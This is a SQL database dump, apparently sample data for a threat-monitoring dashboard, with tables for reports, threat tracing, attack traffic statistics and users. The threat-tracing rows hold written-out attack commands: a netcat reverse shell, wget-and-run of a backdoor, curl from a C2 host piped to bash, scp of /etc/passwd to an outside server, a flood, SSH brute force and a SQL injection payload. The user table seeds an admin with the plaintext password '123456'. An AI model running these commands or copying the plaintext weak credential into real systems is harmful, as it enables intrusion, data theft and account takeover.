INSERT INTO `threat_report_config` VALUES (8, '合规检查报告', '2025-11-20 00:00:00', '2025-11-27 23:59:59', 3, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
INSERT INTO `threat_report_config` VALUES (9, '系统审计报告', '2025-11-27 00:00:00', '2025-11-27 12:00:00', 2, '/download/reports/audit_20251127_am.pdf', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
INSERT INTO `threat_report_config` VALUES (10, '应急响应报告', '2025-11-27 14:00:00', '2025-11-27 16:00:00', 0, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for threat_source_tracing
-- ----------------------------
DROP TABLE IF EXISTS `threat_source_tracing`;
CREATE TABLE `threat_source_tracing`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `threat_source` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '威胁来源',
  `malicious_ip` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '恶意IP',
  `attack_cmd` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '去掉默认值，因TEXT类型不支持',
  `malware_origin` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '恶意软件来源',
  `attack_path` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '去掉默认值，因TEXT类型不支持',
  `flow_chart` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_malicious_ip`(`malicious_ip` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of threat_source_tracing
-- ----------------------------
INSERT INTO `threat_source_tracing` VALUES (1, '境外黑客组织', '143.248.12.78', 'nc -e /bin/sh 143.248.12.78 8080', '暗网论坛', 'Web服务器 -> 数据库服务器', '/charts/flow_20251127_001.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (2, '钓鱼邮件', '218.93.125.46', 'wget http://malware.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh', '恶意邮件附件', '终端 -> 内部网络', '/charts/flow_20251127_002.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (3, '漏洞利用', '195.168.76.32', 'exploit/unix/http/apache_struts2_rest_xstream', '漏洞库', 'Web应用 -> 应用服务器', '/charts/flow_20251127_003.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (4, '内部违规操作', '192.168.1.58', 'cp /etc/passwd /tmp/ && scp /tmp/passwd user@external.com:/tmp/', '内部员工', '终端 -> 外部服务器', '/charts/flow_20251127_004.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (5, 'DDoS攻击源', '176.31.245.91', 'hping3 -S -p 80 --flood 192.168.1.100', '僵尸网络', '攻击节点 -> 目标服务器', '/charts/flow_20251127_005.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (6, '恶意软件', '138.201.97.65', 'powershell -exec bypass -f malware.ps1', '恶意下载站点', '终端 -> 文件服务器', '/charts/flow_20251127_006.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (7, '供应链攻击', '94.102.58.17', 'curl http://c2.server.com/command && bash', '第三方组件', '应用组件 -> 核心系统', '/charts/flow_20251127_007.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (8, '暴力破解', '61.135.18.24', 'hydra -l admin -P password.txt ssh://192.168.1.105', '字典库', '外部 -> SSH服务', '/charts/flow_20251127_008.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (9, 'SQL注入', '185.234.76.12', 'union select 1,2,concat(user(),\':\',password()) from mysql.user', '黑客工具', 'Web应用 -> 数据库', '/charts/flow_20251127_009.png', '2025-11-27 22:42:05');
INSERT INTO `threat_source_tracing` VALUES (10, '远程代码执行', '124.198.36.57', 'cmd.exe /c tasklist > C:\\temp\\task.txt', '漏洞利用工具', '应用服务器 -> 操作系统', '/charts/flow_20251127_010.png', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for threat_traffic_stat
-- ----------------------------
DROP TABLE IF EXISTS `threat_traffic_stat`;
CREATE TABLE `threat_traffic_stat`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `attack_type` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '攻击类型',
  `source_ip` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '源IP',
  `target_ip` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '目标IP',
  `stat_time` datetime NOT NULL COMMENT '统计时间',
  `attack_count` int NOT NULL DEFAULT 0 COMMENT '攻击次数',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_stat_time`(`stat_time` ASC) USING BTREE,
  INDEX `idx_attack_type`(`attack_type` ASC) USING BTREE,
  INDEX `idx_source_target_ip`(`source_ip` ASC, `target_ip` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of threat_traffic_stat
-- ----------------------------
INSERT INTO `threat_traffic_stat` VALUES (1, 'SQL注入', '185.234.76.12', '192.168.1.101', '2025-11-27 08:15:30', 28, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (2, 'DDoS', '176.31.245.91', '192.168.1.102', '2025-11-27 09:30:45', 156, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (3, 'XSS攻击', '203.0.113.45', '192.168.1.103', '2025-11-27 10:45:12', 42, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (4, '暴力破解', '61.135.18.24', '192.168.1.104', '2025-11-27 11:20:56', 93, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (5, '远程代码执行', '124.198.36.57', '192.168.1.105', '2025-11-27 13:10:23', 17, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (6, '漏洞利用', '195.168.76.32', '192.168.1.106', '2025-11-27 14:25:48', 35, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (7, '钓鱼攻击', '218.93.125.46', '192.168.1.107', '2025-11-27 15:40:11', 8, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (8, '中间人攻击', '143.248.12.79', '192.168.1.108', '2025-11-27 16:55:33', 22, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (9, '恶意软件传输', '138.201.97.65', '192.168.1.109', '2025-11-27 17:30:59', 14, '2025-11-27 22:42:05');
INSERT INTO `threat_traffic_stat` VALUES (10, '端口扫描', '94.102.58.18', '192.168.1.110', '2025-11-27 18:45:27', 76, '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for sys_user
-- ----------------------------
DROP TABLE IF EXISTS `sys_user`;
CREATE TABLE `sys_user` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '用户名',
  `password` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '密码',
  `role` tinyint NOT NULL DEFAULT 2 COMMENT '角色：1-管理员、2-普通用户',
  `status` tinyint NOT NULL DEFAULT 1 COMMENT '状态：0-禁用、1-启用',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `idx_username`(`username` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of sys_user
-- ----------------------------
INSERT INTO `sys_user` VALUES (1, 'admin', '123456', 1, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');

SET FOREIGN_KEY_CHECKS = 1;
